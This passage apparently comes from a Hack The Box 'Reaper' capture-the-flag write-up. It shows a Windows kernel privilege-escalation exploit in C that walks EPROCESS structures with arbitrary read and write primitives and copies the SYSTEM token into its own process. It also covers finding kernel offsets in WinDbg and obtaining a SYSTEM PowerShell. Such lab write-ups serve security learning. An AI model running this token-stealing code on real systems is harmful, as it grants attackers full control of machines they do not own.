+    <span class="n">input</span><span class="p">.</span><span class="n">src_addr</span> <span class="o">=</span> <span class="n">src</span><span class="p">;</span>
+    <span class="n">input</span><span class="p">.</span><span class="n">dst_addr</span> <span class="o">=</span> <span class="n">dst</span><span class="p">;</span>
+
+    <span class="n">Init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">input</span><span class="p">);</span>
+    <span class="n">Copy</span><span class="p">();</span>
+    <span class="n">Free</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<h3 id="find-token-addresses">Find Token Addresses</h3>
+<h4 id="common-code-from-xct">Common Code from xct</h4>
+<p>xct, the author of this machine, has a repo on GitHub named <a href="https://github.com/xct/windows-kernel-exploits">windows-kernel-exploits</a>, from which I’ll borrow a lot of code. The main thing I need at this point is a way to find target processes in memory, specifically to get the address of their tokens.</p>
+<p>There is a function named <code class="language-plaintext highlighter-rouge">GetCurrentEProcess</code> <a href="https://github.com/xct/windows-kernel-exploits/blob/1c1f96f2274eb819c0fc36dcb479e80beef36ba4/windows-exploits/HevdPoolOverflowWin7x64.cpp#L60">on GitHub</a>, which I’ll update to <code class="language-plaintext highlighter-rouge">GetEProcessByPid</code>:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// modified from https://github.com/xct/windows-kernel-exploits/blob/1c1f96f2274eb819c0fc36dcb479e80beef36ba4/windows-exploits/HevdPoolOverflowWin7x64.cpp#L60</span>
+<span class="n">eProcResult</span> <span class="nf">GetEProcessByPid</span><span class="p">(</span><span class="n">DWORD</span> <span class="n">targetPid</span><span class="p">)</span> <span class="p">{</span>
+	<span class="c1">// find system EPROCESS &amp; token</span>
+	<span class="n">ULONGLONG</span> <span class="n">systemProc</span> <span class="o">=</span> <span class="n">getSystemEProcess</span><span class="p">();</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"[&gt;] System _EPROCESS: 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">systemProc</span><span class="p">);</span>
+
+	<span class="c1">// walk ActiveProcessLinks to find our process</span>
+	<span class="n">BOOL</span> <span class="n">found</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">ULONGLONG</span> <span class="n">cProcess</span> <span class="o">=</span> <span class="n">systemProc</span><span class="p">;</span>
+	<span class="n">DWORD</span> <span class="n">cPid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">ULONGLONG</span> <span class="n">cTokenPtr</span><span class="p">;</span>
+
+	<span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="n">found</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">cProcess</span> <span class="o">=</span> <span class="n">arbRead</span><span class="p">(</span><span class="n">cProcess</span> <span class="o">+</span> <span class="mh">0x188</span><span class="p">);</span> <span class="c1">// get next entry in ActiveProcessLinks (dt _EPROCESS)</span>
+		<span class="n">cProcess</span> <span class="o">-=</span> <span class="mh">0x188</span><span class="p">;</span> <span class="c1">// get back to start of _EPROCESS (otherwise it points directly to next entry 0x188 offset)</span>
+		<span class="n">cPid</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">arbRead</span><span class="p">(</span><span class="n">cProcess</span> <span class="o">+</span> <span class="mh">0x180</span><span class="p">);</span>
+		<span class="n">cTokenPtr</span> <span class="o">=</span> <span class="n">arbRead</span><span class="p">(</span><span class="n">cProcess</span> <span class="o">+</span> <span class="mh">0x208</span><span class="p">);</span>
+		<span class="k">if</span> <span class="p">(</span><span class="n">cPid</span> <span class="o">==</span> <span class="n">targetPid</span><span class="p">)</span> <span class="p">{</span>
+			<span class="n">printf</span><span class="p">(</span><span class="s">"[&gt;] System Process: %llx (PID: %d, TOKEN_PTR: %llx)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">cProcess</span><span class="p">,</span> <span class="n">cPid</span><span class="p">,</span> <span class="n">cTokenPtr</span><span class="p">);</span>
+			<span class="n">found</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+			<span class="k">break</span><span class="p">;</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">found</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">"Could not find current process in ActiveProcessLinks</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+		<span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="k">static</span> <span class="n">eProcResult</span> <span class="n">result</span><span class="p">;</span>
+	<span class="n">result</span><span class="p">.</span><span class="n">eProcess</span> <span class="o">=</span> <span class="n">cProcess</span><span class="p">;</span>
+	<span class="n">result</span><span class="p">.</span><span class="n">tokenPtr</span> <span class="o">=</span> <span class="n">cTokenPtr</span><span class="p">;</span>
+	<span class="n">result</span><span class="p">.</span><span class="n">pid</span> <span class="o">=</span> <span class="n">cPid</span><span class="p">;</span>
+	<span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>I’ll note that this function relies on a function named <code class="language-plaintext highlighter-rouge">arbRead</code>, which is why I’ve created that function and named it that way.</p>
+<p>There’s a ton of structs and a couple functions that I’ll need to grab from that repo as well:</p>
+<ul>
+<li><code class="language-plaintext highlighter-rouge">struct eProcResult</code> (<a href="https://github.com/xct/windows-kernel-exploits/blob/1c1f96f2274eb819c0fc36dcb479e80beef36ba4/windows-exploits/HevdPoolOverflowWin7x64.cpp#L34">src</a>)</li>
+<li><code class="language-plaintext highlighter-rouge">SystemHandleInformation</code> and <code class="language-plaintext highlighter-rouge">SystemHandleInformationSize</code> (<a href="https://github.com/xct/windows-kernel-exploits/blob/1c1f96f2274eb819c0fc36dcb479e80beef36ba4/windows-exploits/Common.h#-L25">src</a>)</li>
+<li><code class="language-plaintext highlighter-rouge">NTSTATUS (WINAPI *fNtQuerySystemInformation)</code> (<a href="https://github.com/xct/windows-kernel-exploits/blob/1c1f96f2274eb819c0fc36dcb479e80beef36ba4/windows-exploits/Common.h#L175">src</a>)</li>
+<li><code class="language-plaintext highlighter-rouge">struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO</code> (<a href="https://github.com/xct/windows-kernel-exploits/blob/1c1f96f2274eb819c0fc36dcb479e80beef36ba4/windows-exploits/Common.h#L182">src</a>)</li>
+<li><code class="language-plaintext highlighter-rouge">struct _SYSTEM_HANDLE_INFORMATION</code> (<a href="https://github.com/xct/windows-kernel-exploits/blob/1c1f96f2274eb819c0fc36dcb479e80beef36ba4/windows-exploits/Common.h#L193">src</a>)</li>
+<li><code class="language-plaintext highlighter-rouge">getSystemEProcess</code> (<a href="https://github.com/xct/windows-kernel-exploits/blob/1c1f96f2274eb819c0fc36dcb479e80beef36ba4/windows-exploits/Common.cpp#L149">src</a>)</li>
+</ul>
+<h4 id="enable-kernel-debugging">Enable Kernel Debugging</h4>
+<p>With all of the pieces above, the executable will compile, but it won’t work. That’s because the offsets in the <code class="language-plaintext highlighter-rouge">GetEProcessByPid</code> function are not correct for this operating system. I’ll create a Windows 10 Pro VM and boot it, setting up Kernel debugging from my standard Windows VM using the following steps.</p>
+<p>With both VMs shutdown, I’ll enable a serial port in the VM settings. For example, on the new VM to be debugged:</p>
+<picture>
+<source srcset="/img/image-20250826103716020.webp" type="image/webp"/>
+<img alt="image-20250826103716020" class="include_image" loading="lazy" src="/img/image-20250826103716020.png"/>
+</picture>
+<p>The settings on the debugging machine are the same, except I’ll check “Connect to existing pipe/socket”.</p>
+<p>I’ll boot the debugged machine and in a <code class="language-plaintext highlighter-rouge">cmd</code> window as administrator, run:</p>
+<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">bcdedit</span> <span class="na">/set </span><span class="nb">debug</span> <span class="na">on</span>
+<span class="nb">bcdedit</span> <span class="na">/set </span><span class="kd">debugtype</span> <span class="kd">serial</span>
+<span class="nb">bcdedit</span> <span class="na">/set </span><span class="kd">debugport</span> <span class="m">1</span>
+<span class="nb">bcdedit</span> <span class="na">/set </span><span class="kd">baudrate</span> <span class="m">115200</span>
+</code></pre></div></div>
+<p>I’ll reboot the VM. In the debugging VM, I’ll start WinDbg (as administrator) and File –&gt; “Attach to kernel”. In this dialog, I’ll fill in the COM tab as follows and click OK:</p>
+<picture>
+<source srcset="/img/image-20250826104019652.webp" type="image/webp"/>
+<img alt="image-20250826104019652" class="include_image" loading="lazy" src="/img/image-20250826104019652.png"/>
+</picture>
+<p>It shows waiting for a connection:</p>
+<picture>
+<source srcset="/img/image-20250826104112024.webp" type="image/webp"/>
+<img alt="image-20250826104112024" class="include_image" loading="lazy" src="/img/image-20250826104112024.png"/>
+</picture>
+<p>Now I’ll need to trigger a break to get it to connect. There are many ways to do this, but I ran <code class="language-plaintext highlighter-rouge">bcdedit /set testsigning on</code> and rebooted.</p>
+<h4 id="find-kernel-offsets">Find Kernel Offsets</h4>
+<p>I don’t need to be in any specific context, but rather I want to look at the <code class="language-plaintext highlighter-rouge">nt!_EPROCESS</code> structure. The WinDBG <code class="language-plaintext highlighter-rouge">dt</code> command will do that:</p>
+<picture>
+<source srcset="/img/image-20250826102945280.webp" type="image/webp"/>
+<img alt="image-20250826102945280" class="include_image" loading="lazy" src="/img/image-20250826102945280.png"/>
+</picture>
+<p>I need the offset to the process ID (0x440) and the link to the next process (<code class="language-plaintext highlighter-rouge">ActiveProcessLinks</code>, 0x448). I’ll also want the <code class="language-plaintext highlighter-rouge">Token</code> (0x4b8):</p>
+<picture>
+<source srcset="/img/image-20250826103054775.webp" type="image/webp"/>
+<img alt="image-20250826103054775" class="include_image" loading="lazy" src="/img/image-20250826103054775.png"/>
+</picture>
+<p>I’ll update the <code class="language-plaintext highlighter-rouge">GetEProcessByPid</code> function to use these in the <code class="language-plaintext highlighter-rouge">while</code> loop.</p>
+<h3 id="main-2">Main</h3>
+<p>From here, I just need a <code class="language-plaintext highlighter-rouge">main</code> function to tie this all together. It’s very simple. Get the process for both the current process and one running as SYSTEM (PID 4 is always a good one there), and use the <code class="language-plaintext highlighter-rouge">arbWrite</code> function to copy the token from PID 4 to the current process. Then run a shell:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">eProcResult</span> <span class="n">currentProcess</span> <span class="o">=</span> <span class="n">GetEProcessByPid</span><span class="p">(</span><span class="n">GetCurrentProcessId</span><span class="p">());</span>
+	<span class="n">eProcResult</span> <span class="n">systemProcess</span> <span class="o">=</span> <span class="n">GetEProcessByPid</span><span class="p">(</span><span class="mi">4</span><span class="p">);</span>
+
+	<span class="n">arbWrite</span><span class="p">(</span><span class="n">currentProcess</span><span class="p">.</span><span class="n">eProcess</span> <span class="o">+</span> <span class="mh">0x4b8</span><span class="p">,</span> <span class="n">systemProcess</span><span class="p">.</span><span class="n">eProcess</span> <span class="o">+</span> <span class="mh">0x4b8</span><span class="p">);</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">"powershell.exe"</span><span class="p">);</span>
+
+	<span class="k">if</span> <span class="p">(</span><span class="n">hReaper</span><span class="p">)</span> <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hReaper</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<h3 id="shell">Shell</h3>
+<p>I’ll compile this in my VM using mingw:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>x86_64-w64-mingw32-gcc reaperpriv.c <span class="nt">-o</span> reaperpriv.exe
+</code></pre></div></div>
+<p>I’ll copy it and paste it into the RDP session. On double-clicking, there’s a shell as system:</p>
+<picture>
+<source srcset="/img/image-20250826103540597.webp" type="image/webp"/>
+<img alt="image-20250826103540597" class="include_image" loading="lazy" src="/img/image-20250826103540597.png"/>
+</picture>
+<p>And I can read <code class="language-plaintext highlighter-rouge">root.txt</code>:</p>
+<div class="language-console windows-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\Users\Administrator\Desktop&gt;</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">.</span><span class="nx">\root.txt</span><span class="w">
+</span><span class="go">58f9ec4f************************
+</span></code></pre></div></div>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2025/08/26/htb-reaper.html"></a>
+</article>
